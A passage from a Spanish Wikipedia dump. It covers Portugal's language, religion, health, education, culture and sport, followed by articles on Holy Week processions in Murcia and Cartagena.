El idioma oficial de Portugal es el portugués según el artículo 11 de la Constitución portuguesa, y lo es desde que el rey Dionisio I de Portugal lo adoptara en 1290 por decreto. Con más de 210 millones de hablantes nativos es la quinta lengua más hablada del mundo y la tercera más hablada en el mundo occidental. Como legado del dominio portugués, es también la lengua oficial en Brasil, Angola, Mozambique, Cabo Verde, Santo Tomé y Príncipe, Guinea-Bisáu, Timor Oriental, Guinea Ecuatorial y Macao, además de ser hablada en la antigua India portuguesa (Goa, Damão, Diu y Dadra y Nagar Haveli). También tiene estatus de lengua oficial en la Unión Europea, la UNASUR, el Mercosur y la Unión Africana.

La lengua portuguesa es una lengua romance como el italiano, el francés, el rumano y el romanche, entre otros, del grupo iberorromance, como el español, el catalán y el gallego. Al portugués también se le conoce como la «lengua de Camões» (debido a Luis de Camões, autor de "Os Lusíadas"), «la última flor del Lacio», expresión usada en el soneto "Língua Portuguesa" de Olavo Bilac y también la «dulce lengua» por parte de Miguel de Cervantes.

También está reconocida y protegida oficialmente la lengua de signos, por el artículo 74 de la Constitución portuguesa. El mirandés, que está protegido oficialmente en el concejo de Miranda del Duero, tiene su origen en el asturleonés y se enseña como segunda lengua en las escuelas del concejo de Miranda del Duero y parte del concejo de Vimioso. Su uso está bastante restringido aunque hay acciones que garantizan los derechos lingüísticos de su comunidad de hablantes.

La Constitución portuguesa garantiza la libertad religiosa y la igualdad entre religiones. No obstante, existe un concordato que privilegia a la Iglesia católica en varias dimensiones de la vida social, tal es el caso de algunas ceremonias oficiales públicas como las inauguraciones oficiales del Estado en las que hay presencia de un representante de la Iglesia católica. Sin embargo, las creencias religiosas de los políticos electos son consideradas como algo irrelevante para los electores. Prueba de esto es que los dos anteriores presidentes de la República (Mário Soares y Jorge Sampaio) eran personas abiertamente laicas.
La mayoría de los portugueses (el 84,6 % de la población total, según los resultados oficiales del censo de 2001), se inscriben en la tradición católica. En cuanto a la práctica dominical del catolicismo, según un estudio del mismo año realizado por la propia Iglesia católica en Portugal, hay 1 933 677 católicos practicantes (el 18,7 % de la población total) y el número de personas que comulgan es de 1 065 036 (el 10,3 % de la población total). Cerca de la mitad de los matrimonios son católicos aunque se permiten los matrimonios entre personas del mismo sexo y el divorcio según establece el Código Civil portugués, a pesar de que el Derecho Canónico no prevé estas figuras. Existen veinte diócesis en Portugal, agrupadas en tres distritos eclesiásticos: Braga, Lisboa y .
El protestantismo en Portugal tiene varias denominaciones y provienen mayoritariamente de cultos con inspiración evangélica neopentecostal (por ejemplo, las Asambleas de Dios en Portugal y la Iglesia Maná) o de inmigración brasileña, por ejemplo, la Iglesia Universal del Reino de Dios.

Los Testigos de Jehová cuentan con cerca de 50 000 fieles en Portugal, distribuidos en cerca de 650 congregaciones. La religión está presente en el país desde 1925 y fue prohibida oficialmente entre 1961 y 1974, período en el que operó en la clandestinidad. En diciembre de 1974, la Asociación de Testigos de Jehová fue reconocida legalmente y hoy en día tiene su sede en Alcabideche.

La comunidad judía en Portugal ha conseguido mantenerse hasta la actualidad, a pesar de la orden de expulsión de los judíos el 5 de diciembre de 1496 por decreto de Manuel I, lo que obligó a muchos a elegir entre las conversiones forzadas o la efectiva expulsión del país, o la cárcel y las consecuentes penas dictadas por la Inquisición portuguesa que, por este motivo, fue una de las más activas de Europa. La forma en que el culto se desarrolló en Belmonte es uno de los ejemplos de la perseverancia de los judíos como unidad en Portugal. En 1506, en Lisboa se produjo una masacre de judíos en la que perdieron la vida entre 2000 y 4000 personas y fue una de las más violentas de la época en Europa. Existen también minorías islámicas (15 000 personas) e hindúes que son, en su mayoría, descendientes de inmigrantes, así como focos puntuales de budistas, gnósticos y espiritistas.

El sistema de salud portugués se caracteriza por estar formado por tres sistemas coexistentes: el «Servicio Nacional de Salud» (SNS), los regímenes de «seguros especiales de salud social para ciertas profesiones» (subsistemas de salud), y los «seguros privados de salud voluntarios». El SNS proporciona cobertura universal. Además, entorno al 25 % de la población está cubierto por subsistemas de salud, el 10 % por seguros privados, y el otro 7 % por agrupaciones mutuales.

El Ministerio de Sanidad es el responsable de desarrollar políticas en materia de salud, así como el encargado de dirigir el SNS. También hay cinco administraciones regionales de sanidad que se encargan de implementar los objetivos fijados por el Ministerio de Salud para el SNS, de desarrollar las líneas maestras y sus protocolos, y también de supervisar la actuación de los cuidados en salud. Los esfuerzos de descentralización están actualmente en curso y se basan en compartir la responsabilidad financiera y de gestión a nivel regional. Sin embargo, en la práctica, la autonomía de las administraciones regionales de salud se limita a la atención primaria. El SNS está financiado principalmente por la recaudación de los impuestos generales. El empleo y las contribuciones de los empleados representan la fuente de financiación principal de los subsistemas de salud. Además, los pagos directos de los pacientes y los seguros privados de salud voluntarios aportan una gran parte de los fondos.

Al igual que en otros países de la Unión Europea, la mayoría de los portugueses muere por enfermedades crónicas. La mortalidad asociada a enfermedades cardiovasculares es mayor que en la eurozona; pero sus dos componentes principales (las isquemias cardíacas y los accidentes cerebrovasculares) presentan tendencias inversas a las presentes en los países de la eurozona, con los accidentes cardiovasculares como el mayor causante de muertes en Portugal (17 %). El 12 % de los portugueses mueren de cáncer, una tasa inferior a la de la eurozona, aunque la tasa no disminuye tan rápido como en Europa. Portugal tiene la mayor tasa de mortalidad por diabetes de la eurozona, con un importante incremento a finales de la década de 1980.

La tasa de mortalidad infantil de Portugal se ha visto fuertemente reducida desde finales de la década de 1980, cuando veinticuatro de cada mil recién nacidos morían antes de llegar a su primer año de vida. En 2006, esta cifra se situaba en tres muertes por cada mil recién nacidos. Esta mejora se debe principalmente al descenso de la mortalidad neonatal, de 15,5 a 3,4 por cada mil nacidos vivos. En 2010, la esperanza de vida era de 78,88 años.

Lisboa (con cerca de 500 000 habitantes y 2,1 millones de habitantes en la región de Lisboa) es la capital desde el siglo XII, la mayor ciudad del país, el principal centro económico, el principal puerto marítimo y aeropuerto portugués y la ciudad más rica de Portugal con un PIB "per cápita" superior a la media de la Unión Europea. Otras ciudades importantes son Oporto (cerca de 240 000 habitantes y 1 000 000 en el Gran Oporto), la segunda mayor ciudad y centro económico, Aveiro (considerada la Venecia portuguesa), Braga (la ciudad de los arzobispos), Chaves (ciudad histórica y milenaria), Coímbra (con la universidad más antigua del país), Guimarães (cuna de la nación), Elvas (ciudad más fortificada de Europa), Évora (ciudad-museo), Setúbal (tercer puerto más importante), Portimão (3. puerto de cruceros) Faro y Viseu.

En el área metropolitana de Lisboa hay ciudades con gran densidad de población como Agualva-Cacém y Queluz (municipio de Sintra), Amadora, Almada, Amora, Seixal, Barreiro, Montijo y Odivelas. En la región metropolitana de Oporto los municipios más poblados son Vila Nova de Gaia, Maia, Matosinhos y Gondomar. En la Región Autónoma de Madeira la principal ciudad es Funchal. En la región autónoma de las Azores hay tres ciudades principales: Ponta Delgada, en la isla de San Miguel; Angra do Heroísmo, en la isla de Terceira y Horta, en la isla de Faial.

El sistema educativo portugués está regulado por el Estado a través del Ministerio de Educación y Ciencia. El sistema de enseñanza pública es el más usado y el más extendido aunque también existen otras escuelas privadas para cualquier nivel de enseñanza.

El sistema educativo se divide en preescolar (para aquellos que tienen menos de seis años), educación básica (duración de nueve años; en tres etapas y obligatoria), educación secundaria (duración de tres años, hasta el duodécimo grado y obligatorio desde 2009), y educación superior (universidad y politécnica). Al final de cada ciclo, los alumnos realizan pruebas de evaluación (1. y 2º ciclo) y el examen nacional (3. ciclo) en las disciplinas de Matemáticas y Portugués. Las pruebas evalúan a los alumnos sobre las materias aprendidas durante el ciclo correspondiente.

El ciclo secundario tiene un sistema de organización propio, diferente del de los otros ciclos. Existe también la posibilidad para cualquier estudiante de asistir a cursos de formación y de educación, que equivalen al 9º año (o primer año de secundaria) y los cursos profesionales, que equivalen al 12º año (3. y último año de secundaria), en el marco de la iniciativa «Nuevas Oportunidades». Todos los estudiantes pueden concluir la enseñanza secundaria, en régimen diurno o nocturno. Estos cursos están disponibles en cualquier escuela.
Las universidades portuguesas existen desde 1290. La universidad portuguesa más antigua se estableció primero en Lisboa, antes de trasladarse a Coímbra. La mayor universidad de Portugal es la Universidad de Oporto, con cerca de 31 000 alumnos, y su facultad de Ingeniería es la mayor de Europa. Las universidades normalmente se dividen en facultades. El Proceso de Bolonia ha sido adoptado por las universidades e institutos politécnicos portugueses en 2006. También se está construyendo, en la Universidad de Oporto, el mayor polo de Ciencias de la Vida de la península Ibérica, que reunirá el Instituto de Ciencias Biomédicas Abel Salazar y la Facultad de Farmacia.

La tasa de alfabetización total de adultos era en 2003 de aproximadamente el 93,3 %, siendo la tasa en hombres del 95,5 % y de mujeres en 91,3 %. La afluencia de portugueses a la educación primaria está próxima al 100 %. El 20 % de los estudiantes en edad universitaria acude a una de las instituciones de educación superior del país. Además de ser un destino clave para los estudiantes internacionales, Portugal es uno de los mayores lugares de origen de los estudiantes internacionales. El número total de estudiantes en aprendizaje universitario, tanto domésticos como internacionales, era de 380 937 en 2005.

Portugal ha desarrollado una cultura particular, pues ha estado bajo la influencia de las diferentes civilizaciones que cruzaron el Mediterráneo y Europa, aunque también introdujo algunos elementos culturales cuando la nación desempeñó un papel activo durante la Era de los descubrimientos.

Aunque ya en 1956 se había creado en Lisboa la Fundación Calouste Gulbenkian, no fue hasta las décadas de 1990 y 2000 cuando Portugal modernizó sus equipamientos culturales públicos. En Lisboa se creó el Centro Cultural de Belém y en Oporto, la Fundación de Serralves y la Casa da Música, así como otros equipamientos culturales públicos como las bibliotecas municipales y las salas de conciertos que fueron construidos o renovados en muchos municipios por todo el país.

La música tradicional portuguesa es muy variada. Forman parte del folclore las "danças do vira", en la región de Minho, los "pauliteiros" de la zona mirandesa, los "corridinhos" del Algarve o los "bailinhos" de Madeira. Los instrumentos típicos son el "cavaquinho", la gaita, el acordeón, el violín, el tambor, la guitarra portuguesa (típica del fado) y una variedad de instrumentos de viento y de percusión. También existen las orquestas de cada localidad que tocan diversos estilos musicales, desde la popular a la clásica.

El estilo de música portugués más conocido es el fado, que ha ayudado a divulgar el portugués, cuya intérprete más célebre fue Amália Rodrigues, quien también realizó incursiones como actriz y cantante en el cine portugués. Algunos intérpretes populares más recientes son el grupo Madredeus, cuya vocalista era Teresa Salgueiro, y las cantantes Mariza, Mísia, Mafalda Arnauth, Cristina Branco y Dulce Pontes. Entre los intérpretes masculinos más conocidos se encuentran Carlos do Carmo, Alfredo Marceneiro y Camané.

Aunque el fado sigue siendo el género más conocido allende sus fronteras, la «nueva» música portuguesa también tiene un papel importante. Así, podemos destacar a Rui Veloso, padre del "rock" portugués; a Sara Tavares, que tiene un estilo con influencias africanas; a Xutos & Pontapés, grupo de "rock" portugués formado en 1978 y aún activo; a Moonspell, banda de "metal" bastante famosa en Europa o a Blasted Mechanism, grupo de "rock" alternativo.

La música erudita portuguesa constituye un capítulo importante de la música occidental. A lo largo de los siglos han destacado nombres de compositores e intérpretes como los trovadores Martín Codax y Dionisio I; los polifonistas Duarte Lobo, Filipe de Magalhães, Manuel Cardoso y Pedro de Cristo; el organista Manuel Rodrigues Coelho; el compositor y el clavecinista Carlos Seixas; la cantante Luísa Todi; el sinfonista y pianista João Domingos Bomtempo o el compositor y musicólogo Fernando Lopes Graça. La edad de oro de la música portuguesa coincidió con el apogeo de la polifonía clásica en el s. XVII (Escuela de Évora, Santa Cruz de Coimbra). Entre los grandes referentes actuales, sobresalen los nombres de los pianistas Artur Pizarro, Maria João Pires, Olga Prats y Sequeira Costa; de la viola Anabela Chaves; del violinista Carlos Damas; del barítono Jorge Chaminé; del compositor Emmanuel Nunes y del compositor y maestro Álvaro Cassutto. Las orquestas sinfónicas más importantes son la orquesta de la Fundación Calouste Gulbenkian, la Orquesta Nacional de Oporto y la Orquesta Sinfónica Portuguesa. Con respecto a la ópera, el Teatro Nacional de San Carlos, en Lisboa, es el más representativo.

La literatura portuguesa, una de las primeras literaturas occidentales, se desarrolló a través del texto y la música. Comparte sus orígenes con la gallega medieval, en las cantigas galaico-portuguesas. En el canon oficial de la literatura, se da un valor especial, ya reconocido en la época, a la epopeya "Os Lusíadas" de Luís de Camões, que narra en verso los viajes y aventuras de los descubridores portugueses del camino a la India durante el siglo XV. Gil Vicente, por su parte, fue uno de los fundadores de las tradiciones dramáticas portuguesa y española.

Además de estos autores, caben destacar las figuras de Fernando Pessoa, famoso por sus heterónimos, y de Eugénio de Andrade en poesía. En prosa, se pueden destacar algunos nombres como José Saramago, ganador del premio Nobel de Literatura en 1998, Eça de Queirós; autor de "Los Maia", novela culmen del realismo portugués, y de "El crimen del padre Amaro"; Aquilino Ribeiro, que estuvo propuesto al Nobel en 1960 o Miguel Torga, famoso por su defensa del Iberismo. En teatro, además de Gil Vicente, antes mencionado, destacan António José da Silva —apodado «el judío»— y Bernardo Santareno.

El cine portugués tiene una larga tradición, comenzando su andadura en los albores de este arte, a finales del siglo XIX. Directores de cine portugueses como Arthur Duarte, António Lopes Ribeiro, Manoel de Oliveira, António-Pedro Vasconcelos, João Botelho y Leonel Vieira, son algunos de los que han logrado una mayor fama. Algunos actores portugueses famosos son Joaquim de Almeida, Maria de Medeiros, Erica Fontes, Diogo Infante, Soraia Chaves, Vasco Santana, Ribeirinho, y António Silva, entre muchos otros.

Entre las películas, caben destacar algunas bastante famosas como "A canção de Lisboa" (1933), el primer largometraje sonoro íntegramente rodado en Portugal; "Ala-Arriba!" (1942), primera película portuguesa en ganar un premio en el Festival Internacional de Cine de Venecia; "Camoens" (1946), exhibida en el primer festival de Cannes; "A costureirinha da sé" (1958), primera película portuguesa en color y cinemascope; "Dom Roberto" (1962), mención especial del jurado en el festival de Cannes; "Mudar de vida" (1966), uno de los mayores éxitos europeos del cine portugués, seleccionada también para el festival de Venencia; "O sapato de cetim" (1985), producción francoportuguesa, galardonada con el premio de la Crítica en el festival de Venecia; "Recuerdos de la casa amarilla" (1989), León de plata en el festival de Venecia; "Três irmãos" (1994), con la que Maria de Medeiros ganó la Copa Volpi a la mejor actriz del festival de Venecia; "Capitanes de abril" (2000), una de las películas portuguesas más conocidas allende las fronteras; "Alice" (2005), premio «Miradas jóvenes» en el Festival de cine de Venencia al mejor director novel y "Odete" (2005), premio del festival de cine LGTB de Milán, entre otras.

Las actividades de investigación en ciencia y tecnología de Portugal están principalmente organizadas en unidades de investigación y desarrollo pertenecientes a las universidades públicas y a las instituciones autónomas de investigación estatales como el INETI (Instituto Nacional de Ingeniería, Tecnología e Innovación) y el INRB (Instituto Nacional de Recursos Biológicos). La financiación y gestión de este sistema de investigación está principalmente dirigido bajo la autoridad del Ministerio de Educación y Ciencia. Las mayores unidades de I+D de las universidades públicas por volumen de investigaciones y artículos científicos incluyen tanto las instituciones de investigación en biociencias como el Instituto de Medicina Molecular, el Instituto de Ciencias Biomédicas Abel Salazar, el Centro de Neurociencias y Biología Celular, el Instituto de Biología Molecular y Celular o el IMATIMUP (Instituto de Patología e Inmunología Molecular de la Universidad de Oporto). En las universidades privadas el centro de investigación más notable es el Laboratorio de Expresión Facial de la Emoción. También son internacionalmente reconocidos los centros de investigación estatales, en otros campos destaca el Laboratorio Ibérico Internacional de Nanotecnología, una cooperación en investigación entre Portugal y España. Entre las mayores instituciones de investigación no estatales de Portugal están el Instituto Gulbenkian de Ciencia y la Fundación Champalimaud, que año tras año entrega uno de los premios científicos mejor remunerados del mundo. Una de las más antiguas instituciones de enseñanza de Portugal es la Academia de Ciencias de Lisboa.
Portugal ha firmado diversos acuerdos con organizaciones científicas europeas llegando a ser miembro de pleno de dichas organizaciones. Entre estas se incluyen la Agencia Espacial Europea (ESA), el Organización Europea para la Investigación Nuclear (CERN), ITER, y el Observatorio Europeo del Sur (ESO). Portugal ha firmado acuerdos de cooperación con el MIT (Estados Unidos) y otras instituciones norteamericanas para incrementar la capacidad de desarrollo e incrementar la efectividad de investigación y educación superior portuguesa.

Portugal tiene el segundo acuario más grande de Europa, el Oceanário de Lisboa, y tiene también otras instituciones notables de exhibición y divulgación científica, como la agencia estatal "Ciência Viva", un programa del Ministerio de Educación y Ciencia para promocionar la cultura científica y tecnológica entre la población portuguesa, el Museo Científico de la Universidad de Coimbra, el Museo Nacional de Historia Natural en la Universidad de Lisboa, y el Visionarium.

Con el surgimiento y crecimiento de los parques científicos en todo el mundo que han ayudado a crear miles de empresas científicas, tecnológicas y conocimiento, Portugal comenzó a crear diversos parques científicos en todo el país. Entre estos se incluyen el Taguspark (en Oeiras), el Coimbra iParque (en Coímbra), el Madeira Tecnopolo (en Funchal), el Sines Tecnopolo (en Sines), el Tecmaia (en Maia) y el Parkurbis (en Covilhã). Las compañías ubicadas en los diversos parques científicos tienen la ventaja de una mayor cantidad de servicios desde ventajas financieras y legales a soporte publicitario y tecnológico.

De Portugal han salido múltiples científicos e inventores que han contribuido al desarrollo de las ciencias a nivel mundial. Es importante destacar los nombres, en este ámbito, de António Egas Moniz, inventor de la lobotomía y la angiografía y en 1949 por el «descubrimiento del valor terapéutico de la lobotomía en determinadas psicosis»; así como de Jaime Filipe, ganador de diversos premios por algunos inventos como el elevador para sillas de ruedas. Otros inventores portugueses destacados incluyen a Amílcar Ventura, inventor del simulador de conducción para autoescuelas por el que consiguió la medalla de oro en el Salón de Ginebra y Maximiliano Augusto Herrmann, inventor del teléfono de pared en 1880.

La gastronomía es variada. Cada zona del país tiene su plato típico compuesto por diversas carnes (ternera, oveja, cerdo y las carnes blancas), por diferentes embutidos, tipos de pescados (sobre todo de bacalao) y de mariscos. Entre los quesos destacan el Serra da Estrela, el Azeitão y el São Jorge, entre muchos otros.

Portugal es un país fuertemente vinícola, y son célebres los vinos del Douro, del Alentejo y del Dão, los vinos verdes del Minho, y los vinos licorosos de Oporto y de Madeira. En cuanto a la repostería existen una enorme variedad de recetas tradicionales como los famosos pasteles de Belém, los huevos moles de Aveiro, el pastel de Tentúgal, la "sericaia" o el bizcocho de Ovar, así como muchos otros.

De entre los platos populares, destacan el cocido a la portuguesa, el «bacalao dorado», el «bacalao a la Gomes de Sá», las "espetadas" de Madeira, el «cocido volcánico» de las Azores, el «lechón asado a la Bairrada», los «Rojões» del Aveiro y del Minho, la chanfana de Beira, la carne de cerdo a la alentejana, el pescado asado (en todo el país), las tripas (de la región de Oporto), las «pataniscas de bacalao» y el gazpacho portugués. La cocina portuguesa ha influido otras gastronomías como la japonesa, con la introducción de la tempura.

Los más antiguos ejemplos de arquitectura portuguesa se remontan a los primeros pobladores. Entre las abundantes evidencias de monumentos megalíticos en territorio luso cabe destacar el crómlech de los Almendros, uno de los más importantes de Europa. La llegada de los romanos trajo consigo su arquitectura y un buen ejemplo de ella es el templo romano de Évora, dedicado a la diosa Diana.

Tras la caída del Imperio romano, los visigodos también dejaron su impronta en la arquitectura, y buena muestra de ella es la capilla de San Fructuoso de Montelios. Durante el periodo de dominación musulmana (711-1249), éstos dejaron ejemplos de arte islámico en la mezquita de Mértola, actualmente una iglesia, y el Castelo dos Mouros en Sintra, entre muchos otros.
Tras un extenso periodo de estilo románico, con ejemplos hasta el siglo XVIII, en Portugal también se desarrolló el peculiar estilo manuelino, un estilo gótico tardío financiado por los descubrimientos y caracterizado por la profusión de elementos decorativos de inspiración marítima. De entre ellos, destaca el monasterio de los Jerónimos y la torre de Belém.

El terremoto de Lisboa de 1755 supuso un cambio en el urbanismo de Lisboa. El marqués de Pombal realizó grandes transformaciones en la capital lusa después de la catástrofe y a él se debe, entre otros, la construcción de la praça do Comércio, donde estaba antaño el palacio real. La tradición popular marcó la arquitectura de los años 1950, que fue conocido como «estilo Portugués Suave» y que prevaleció hasta el final del Salazarismo.

La arquitectura contemporánea portuguesa aúna las tradiciones con la intención de innovar desarrollada durante varias generaciones desde mediados del siglo XX hasta la actualidad. Álvaro Siza (premio Pritzker 1992), Fernando Távora, Eduardo Souto de Moura (premio Pritzker 2011), Raul Hestnes Ferreira, Rui Jervis Atouguia, Jorge Ferreira Chaves, Francisco Conceição Silva, Francisco Keil do Amaral, Cassiano Branco, Pancho Guedes, Francisco Castro Rodrigues, Manuel Tainha, Vítor Figueiredo, Gonçalo Byrne y Tomás Taveira son algunos de los más notables arquitectos portugueses de la época contemporánea.

Portugal también goza de un rico legado en lo que a pintura se refiere. Los primeros pintores lusos de los que se conoce el nombre se remontan al siglo XV, como Nuno Gonçalves, representante del periodo de pintura gótica. José Malhoa, conocido por su trabajo "Fado", y Columbano Bordalo Pinheiro (quien pintó los retratos de Teófilo Braga y Antero de Quental) son dos referentes de la pintura naturalista.

En el siglo XX se vio la llegada del modernismo y, junto a él, la de los pintores portugueses de mayor renombre: como Amadeo de Souza-Cardoso, quien fue fuertemente influenciado por los pintores franceses, particularmente por Robert Delaunay. Entre sus trabajos más conocidos destaca "Canção Popular a Russa e o Fígaro". Otro gran pintor y escritor modernista fue Almada Negreiros, amigo del poeta Fernando Pessoa, a quien retrató. Almada Negreiros también estuvo profundamente influenciado tanto por el cubismo como por el futurismo. Entre los personajes importantes dentro las artes visuales actuales están pintores como Vieira da Silva, Júlio Pomar y Paula Rego.

Dentro de la escultura son destacables los nombres de Jorge Vieira, que trabajó sobre todo la madera; Alberto Carneiro, el «inventor de objetos»; Rui Chafes, trabajador del hierro y João Cutileiro y Francisco Simões, que realizan su trabajo en mármoles de diversos colores.

En cuanto a la fotografía artística, cabe destacar los nombres de Joshua Benoliel, primer reportero fotográfico que dejó una gran colección de imágenes de los últimos años de la monarquía, la llegada de la República y el inicio de la Primera Guerra Mundial. Actualmente, destacan los nombres de Helena Almeida y Jorge Molder, entre otros.

El fútbol es el deporte más conocido y el más practicado en Portugal. Eusébio da Silva Ferreira es aún un gran símbolo de la historia del fútbol portugués, en la que también destacan otros nombres más recientes como Paulo Futre, Luís Figo, Vítor Baía, Rui Costa, João Vieira Pinto, Fernando Couto, Simão Sabrosa, Pedro Pauleta o Cristiano Ronaldo. Los principales clubes de Portugal son el Benfica, el FC Oporto, y el Sporting. Portugal es considerada, según el ranking de la FIFA a día 1 de junio de 2017, la 8.ª mejor selección de fútbol. La selección lusa alcanzó un 3. puesto en el Mundial de fútbol de 1966 y un 4º en el de 2006. A nivel europeo, cabe destacar su primer puesto en la Eurocopa 2016 disputada en Francia.

Portugal también destaca en el hockey sobre patines pues posee quince campeonatos mundiales, veinte europeos y quince Copa de las Naciones de Montreux, entre otros. Asimismo, Portugal ha acogido una carrera del ; el Gran Premio de Portugal, que se celebró entre 1958 y 1960 y nuevamente entre 1984 y 1996 en el circuito de Estoril. Actualmente, el circuito es sede del Gran Premio de Portugal del Campeonato del Mundo de Motociclismo.

Otras modalidades deportivas en las que el país sobresale a nivel internacional son, además del fútbol, el rugby, la vela, la hípica, el judo, el ciclismo, el esgrima, el atletismo y el tiro con arco. Portugal ha participado en todos los Juegos Olímpicos desde los Juegos Olímpicos de Estocolmo 1912, y ha ganado cuatro medallas de oro en atletismo (Carlos Lópes, en los Juegos Olímpicos de Los Ángeles 1984, Rosa Mota en los Juegos Olímpicos de Seúl 1988, Fernanda Ribeiro en los Juegos Olímpicos de Atlanta 1996 y Nelson Évora en los Juegos Olímpicos de Pekín 2008) y numerosas medallas de plata y bronce en otros deportes.





</doc>
<doc id="6397" url="https://es.wikipedia.org/wiki?curid=6397" title="Semana Santa en Murcia">
Semana Santa en Murcia

La Semana Santa de Murcia es una fiesta religiosa declarada de que se desarrolla cada año entre el Viernes de Dolores y el Domingo de Resurrección en la ciudad de Murcia (España).

Se trata de una de las Semanas Santas españolas de mayor importancia tanto por su excelente patrimonio escultórico; destacando las tallas de Francisco Salzillo (siglo XVIII), además de las de Diego de Ayala y Domingo Beltrán (siglo XVI), Nicolás de Bussy (siglo XVII), Antonio Dupar, Nicolás Salzillo y Roque López (siglo XVIII), y los contemporáneos Juan González Moreno, José Planes o José Hernández Navarro, como también por poseer un estilo propio (el "estilo tradicional") originario del siglo XVIII y que supone una forma única en España de celebrar la pasión, lo que la convierte en una semana santa especial en el panorama nacional al escapar de la omnipresente influencia andaluza (ya sea sevillana o malagueña) y distinguirse también del estilo castellano, constituyendo así un importantísimo patrimonio etnográfico. 

Es así mismo la celebración más antigua con la que cuenta la ciudad puesto que la cofradía decana, "Los Coloraos", hunde sus raíces en los comienzos del siglo XV.

La Semana Santa de Murcia fue declarada de con fecha 5 de abril de 2011.

En la actualidad son 15 las cofradías murcianas que se encargan de sacar a la calle 94 tronos o pasos procesionales cada Semana Santa con sus respectivas hermandades. En Murcia, como rasgo peculiar, cada paso procesional forma una hermandad constituida por los nazarenos penitentes y los "estantes" (los que portan el trono); ya que los 94 pasos son llevados a hombros, esto hace que cada una de las 15 cofradías esté constituida a su vez por diferentes hermandades, que van desde la única de la Cofradía del Refugio ("el Silencio"), hasta las 14 hermandades de Los Coloraos (divididas entre sus dos procesiones, 11 el Miércoles Santo y 3 el Jueves Santo).

Estas 15 cofradías sacan a la calle 17 procesiones.

Las procesiones son en su totalidad por la tarde o por la noche (con salida entre las 17:00 y las 22:00 horas), salvo el Viernes Santo (6:00 hora solar) y el Domingo de Resurrección (8:15 h.), días en los que hay procesiones por la mañana.

Así mismo es una Semana Santa llena de matices y muy diversa, puesto que disfruta de dos estilos diferentes de procesionar, uno de ellos totalmente exclusivo de Murcia: 









La primera cofradía en desfilar por las calles de Murcia inaugurando la Semana Santa es la Venerable Cofradía del Santísimo Cristo del Amparo y María Santísima de los Dolores (1985), con su túnica de color azul, que procesiona desde el céntrico barrio de San Nicolás, contando con la venerada imagen de "Nuestro Padre Jesús del Gran Poder" de Nicolás de Bussy (siglo XVII) o un bellísimo crucificado atribuido a Antonio Dupar (siglo XVIII).

En esta segunda jornada Murcia se llena de ambiente nazareno con el desfile de dos cofradías, las más recientes, y un total de diez pasos y hermandades:

También se produce el traslado y posterior encuentro de "Nuestro Padre Jesús de las Mercedes", de la Cofradía de la Salud, desde la Iglesia conventual de La Merced a la sede de la Cofradía.

En este importante día de la Semana Santa desfila la Pontificia, Real y Venerable Cofradía del Santísimo Cristo de la Esperanza, María Santísima de los Dolores y del Santo Celo por la Salvación de las Almas (1754), considerada la primera de las "tradicionales" al ser durante mucho tiempo la que inauguraba las procesiones. Sus titulares son importantes obras de Francisco Salzillo (siglo XVIII). Parte de la Iglesia de San Pedro Apóstol.

En esta jornada de Lunes Santo tiene lugar la procesión de la Real, Ilustre y Muy Noble Cofradía del Santísimo Cristo del Perdón, siendo una de las más antiguas de la ciudad ya que sus orígenes se remontan a la Hermandad del Prendimiento fundada en 1600, aunque la institución actual data de 1896. Su túnica es de color magenta, partiendo de la Iglesia de San Antolín. Es una de las procesiones más populares de Murcia y su titular (el "Cristo del Perdón") uno de los más venerados. Cuenta con un importante número de nazarenos repartidos en sus 11 hermandades de estilo Tradicional.

Este día salen a las calles murcianas dos cofradías, ambas de estilo de Silencio, con un total de 8 hermandades: 


Estamos ante uno de los días clave de la Semana Santa de Murcia. Por la mañana se produce el solemne traslado de "Nuestro Padre Jesús Nazareno", titular de "Los Salzillos", desde el Convento de las Agustinas del Corpus Christi hasta la capilla de la cofradía, siendo la primera vez en la que se pueden ver las túnicas "morás" por las calles murcianas.

Ya por la tarde tiene lugar el magno y tradicional desfile de Los Coloraos, nombre popular que recibe la Real, Muy Ilustre, Venerable y Antiquísima Archicofradía de la Preciosísima Sangre de Nuestro Señor Jesucristo (1411), que parte de la Iglesia Arciprestal de Nuestra Señora del Carmen. Además de ser la cofradía decana de la Semana Santa de Murcia, cuenta con importantes imágenes de Nicolás de Bussy (siglo XVII), Roque López (siglo XVIII) y González Moreno (mediados del siglo XX). Es quizás la más típica de todas las de estilo "Tradicional", la que más público congrega en las calles y la que más nazarenos cuenta en sus 11 hermandades.

En este importante día de la Semana Santa, hay que destacar por la mañana el traslado del "Santísimo Cristo de Santa Clara la Real", de la "Cofradía del Santo Sepulcro", desde el Monasterio de Santa Clara la Real hasta la Iglesia de San Bartolomé-Santa María, sede de la cofradía. Protagonizando un encuentro con la "Santísima Virgen de la Soledad" en la plaza de Santo Domingo.

Cuando llega la tarde; a parte de los antiquísimos cantos de Auroros que se entonan a las puertas de la Iglesia de Jesús (sede de "Los Salzillos"), sale a la calle:


Ya por la noche tenemos el solemne desfilar de: 


Día crucial en la Semana Santa de Murcia, es la jornada de mayor actividad nazarena al desfilar 4 cofradías (todas de estilo Tradicional), 22 hermandades, 20 pasos y miles de nazarenos. 3 de las cofradías que desfilan son de las más antiguas de la ciudad y cuentan con un patrimonio escultórico de excepción:





Durante esta jornada; la última de los días de pasión, tienen lugar dos procesiones,



En el último día de la Semana Santa tiene lugar la colorista y alegre procesión de la Real y Muy Ilustre Archicofradía de Nuestro Señor Jesucristo Resucitado (1910), conocida popularmente como la ""procesión de los blancos"" (ya que las túnicas son de color blanco y dorado) o incluso como la ""procesión del demonio"", debido al gracioso personaje que abre la procesión: el demonio encadenado. Es la cofradía que saca a la calle más pasos (junto a Los Coloraos y el Perdón), un total de 11, dos alegóricos y 9 que representan escenas de la vida de Cristo resucitado. Parte a las 8:15 h de la Iglesia de Santa Eulalia.




</doc>
<doc id="6398" url="https://es.wikipedia.org/wiki?curid=6398" title="Semana Santa en Cartagena">
Semana Santa en Cartagena

Como en la mayor parte de España, la celebración de la Semana Santa se hace presente cada año en Cartagena con la organización de procesiones. Estas se extienden desde la Madrugada del Viernes de Dolores, festividad de la patrona de la ciudad (la Virgen de la Caridad), hasta el mediodía del Domingo de Resurrección a lo largo de todos los días de la Semana Santa.

La Junta de Cofradías de la Semana Santa cartagenera está integrada por cuatro cofradías penitenciales: Marrajos, Californios, Resucitado y Socorro, de las que las dos primeras procesionan varios días. Las primeras procesiones de las que se tiene constancia, de la cofradía Marraja, salieron por primera vez en el año 1663, si bien la data fundacional de la misma se desconoce con exactitud y podría ser incluso anterior.

La Semana Santa de Cartagena fue declarada de Interés Turístico Internacional en 2005.

